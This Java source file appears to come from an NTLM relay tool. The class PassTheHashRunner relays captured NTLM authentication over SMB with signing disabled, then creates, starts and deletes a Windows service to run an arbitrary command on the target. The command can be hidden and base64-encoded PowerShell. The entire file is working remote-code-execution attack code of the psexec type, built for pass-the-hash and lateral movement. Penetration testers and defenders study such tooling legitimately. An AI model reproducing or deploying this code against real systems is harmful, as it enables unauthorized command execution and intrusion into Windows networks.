package gs.sy.m8.ldapswak;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Base64;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import gs.sy.m8.ldapswak.svcctl.SCMRCloseServiceHandle;
import gs.sy.m8.ldapswak.svcctl.SCMRCreateServiceW;
import gs.sy.m8.ldapswak.svcctl.SCMRDeleteService;
import gs.sy.m8.ldapswak.svcctl.SCMROpenSCManagerW;
import gs.sy.m8.ldapswak.svcctl.SCMROpenServiceW;
import gs.sy.m8.ldapswak.svcctl.SCMRStartService;
import jcifs.CIFSContext;
import jcifs.CIFSException;
import jcifs.DialectVersion;
import jcifs.config.BaseConfiguration;
import jcifs.context.BaseContext;
import jcifs.dcerpc.DcerpcBinding;
import jcifs.dcerpc.DcerpcException;
import jcifs.dcerpc.DcerpcHandle;
import jcifs.ntlmssp.Type1Message;
import jcifs.ntlmssp.Type2Message;
import jcifs.ntlmssp.Type3Message;
import jcifs.smb.SmbAuthException;
import jcifs.smb.SmbException;

public class PassTheHashRunner extends Thread {

	private static final Logger log = LoggerFactory.getLogger(PassTheHashRunner.class);

	private static final long TIMEOUT = 5000;

	private final BaseContext ctx;
	private PassTheHashNtlmCredentials creds;

	private final BaseCommand config;

	static {
		DcerpcBinding.addInterface("svcctl", "367abb81-9844-35f1-ad32-98f038001003:2.0");
	}

	public PassTheHashRunner(Type1Message t1, BaseCommand config) throws CIFSException {
		this.config = config;
		this.ctx = new BaseContext(new BaseConfiguration(true) {

			@Override
			public boolean isDfsDisabled() {
				return true;
			}

			@Override
			public boolean isUseRawNTLM() {
				return true;
			}

			@Override
			public boolean isSigningEnabled() {
				return false;
			}

			@Override
			public boolean isIpcSigningEnforced() {
				return false;
			}

			@Override
			public DialectVersion getMaximumVersion() {
				return DialectVersion.SMB202;
			}

			@Override
			public boolean isRequireSecureNegotiate() {
				return false;
			}
		});
		this.creds = new PassTheHashNtlmCredentials(t1.toByteArray());
		setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
			
			@Override
			public void uncaughtException(Thread t, Throwable e) {
				log.error("Pass the hash routine failed",e);
				creds.getContext().fail();
			}
		});
	}

	public Type2Message go() throws InterruptedException {
		super.start();
		return this.creds.getContext().waitForType2(TIMEOUT);
	}

	public void feed(Type3Message t3) throws InterruptedException {
		this.creds.getContext().setType3(t3);
		join(30000);
		if (isAlive()) {
			interrupt();
			join(1000);
		}
	}

	@Override
	public void run() {
		CIFSContext pthctx = ctx.withCredentials(creds);
		if (this.config.psexecPSHScriptFile != null || this.config.psexecPSHScript != null) {
			String script;
			if (this.config.psexecPSHScriptFile != null) {
				try {
					script = new String(Files.readAllBytes(this.config.psexecPSHScriptFile), StandardCharsets.UTF_8);
				} catch (IOException e) {
					log.error("Failed to read Powershell script " + this.config.psexecPSHScriptFile, e);
					return;
				}

			} else {
				script = this.config.psexecPSHScript;

			}
			runPSExecPSH(pthctx, this.config.relayServer, this.config.psexecServiceName, this.config.psexecDisplayName,
					script, this.config.psexecPSHEncode);
		} else if (this.config.psexecCMD != null ) {
			// CMD
			String cmd = "%COMSPEC% /b /c start /b /min " +  this.config.psexecCMD;
			log.info("Command line {}", cmd);
			runPSExec(pthctx, this.config.relayServer, this.config.psexecServiceName, this.config.psexecDisplayName, cmd);
		} else {
			throw new UnsupportedOperationException("No relay action has been specified");
		}
	}

	private void runPSExecPSH(CIFSContext pthctx, String server, String sname, String displayName, String script,
			boolean encode) {
		String baseCmd = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni";
		String cmd;
		if (encode) {
			String encoded = Base64.getEncoder().encodeToString(script.getBytes(StandardCharsets.UTF_16LE));
			cmd = baseCmd + " -EncodedCommand " + encoded;
		} else {
			cmd = baseCmd + " -c \"" + script + "\"";
		}

		log.info("Command line {}", cmd);
		runPSExec(pthctx, server, sname, displayName, cmd);
	}

	private void runPSExec(CIFSContext ctx, String server, String sname, String displayName, String cmd) {
		try {
			DcerpcHandle hdl = DcerpcHandle.getHandle("ncacn_np:" + server + "[\\PIPE\\svcctl]", ctx);
			hdl.bind();

			log.debug("Service connection successful");

			SCMROpenSCManagerW scm = new SCMROpenSCManagerW(server, null, 0x00000010 | 0x00000002 | 0x00000001);
			hdl.sendrecv(scm);
			if (scm.retval == 5) {
				log.error(
						"Access to service manager denied. Non-admin account or LocalAccountTokenFilterPolicy active");
				return;
			} else if (scm.retval != 0) {
				throw new SmbException(scm.retval, false);
			}

			try {
				SCMRCreateServiceW cs = doCreate(scm.handle, sname, displayName, cmd);
				hdl.sendrecv(cs);

				byte[] sh = null;
				try {

					if (cs.retval == 1073) {
						SCMRCreateServiceW rcs = recreateService(sname, displayName, cmd, hdl, scm);
						sh = rcs.serviceHandle;
					} else if (cs.retval == 1072) {
						log.error("Service is pending deletion, try again later");
						return;
					} else if (cs.retval != 0) {
						throw new SmbException(cs.retval, false);
					} else {
						sh = cs.serviceHandle;
					}

					SCMRStartService start = new SCMRStartService(sh, null);
					hdl.sendrecv(start);

					if (start.retval == 1053) {
						log.info("Service start timeout, expected: this is not an actual service binary");
					} else if (start.retval == 5) {
						log.error("Access denied starting command");
					} else if (start.retval != 0) {
						throw new SmbException(start.retval, false);
					}

				} finally {
					if (sh != null) {
						try {
							SCMRDeleteService del = new SCMRDeleteService(sh);
							hdl.sendrecv(del);
						} finally {
							hdl.sendrecv(new SCMRCloseServiceHandle(sh));
						}
					}
				}
			} finally {
				hdl.sendrecv(new SCMRCloseServiceHandle(scm.handle));
			}

		} catch (SmbAuthException e) {
			log.error("Login failed for {}: {}", creds.getUsername(), e.getMessage());
			log.debug("Login failure", e);
		} catch (Exception e) {
			log.error("Failed to pass-the-hash", e);
		}
	}

	private SCMRCreateServiceW recreateService(String sname, String displayName, String cmd, DcerpcHandle hdl,
			SCMROpenSCManagerW scm) throws DcerpcException, IOException, SmbException, InterruptedException {
		log.info("Service already exists");

		SCMROpenServiceW s = new SCMROpenServiceW(scm.handle, sname, 0x000F01FF);
		hdl.sendrecv(s);

		if (s.retval != 0) {
			throw new SmbException(s.retval, false);
		}

		SCMRDeleteService del;
		try {
			del = new SCMRDeleteService(s.serviceHandle);
			hdl.sendrecv(del);
		} finally {
			hdl.sendrecv(new SCMRCloseServiceHandle(s.serviceHandle));
		}

		if (del.retval != 0) {
			throw new SmbException(del.retval, false);
		}

		SCMRCreateServiceW cs;
		do {
			cs = doCreate(scm.handle, sname, displayName, cmd);
			hdl.sendrecv(cs);
			if (cs.retval == 1072) {
				Thread.sleep(1000);
			}

		} while (cs.retval == 1072);

		if (cs.retval != 0) {
			throw new SmbException(cs.retval, false);
		}
		log.info("Recreated service");
		return cs;
	}

	private SCMRCreateServiceW doCreate(byte[] handle, String name, String displayName, String cmd) {
		SCMRCreateServiceW cs = new SCMRCreateServiceW(handle);

		cs.serviceType = 0x10; // SERVICE_WIN32_OWN_PROCESS
		cs.startType = 0x3; // SERVICE_DEMAND_START
		cs.desiredAccess = 0x00000010 | 0x00000004;
		cs.serviceName = name;
		cs.displayName = displayName;
		cs.binaryPathName = cmd;
		return cs;
	}
}
